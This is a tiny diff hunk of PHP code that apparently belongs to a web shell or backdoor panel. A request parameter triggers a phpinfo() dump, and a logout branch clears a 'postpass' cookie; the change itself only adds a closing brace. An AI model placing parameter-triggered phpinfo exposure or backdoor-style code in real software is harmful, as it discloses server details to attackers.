@@ -59,3 +59,4 @@ if($eanver == "phpinfo") die(phpinfo());
 if($eanver == 'logout'){
 	setcookie('postpass',null);
 	die('<meta http-equiv="refresh" content="0;URL=?">');
+}
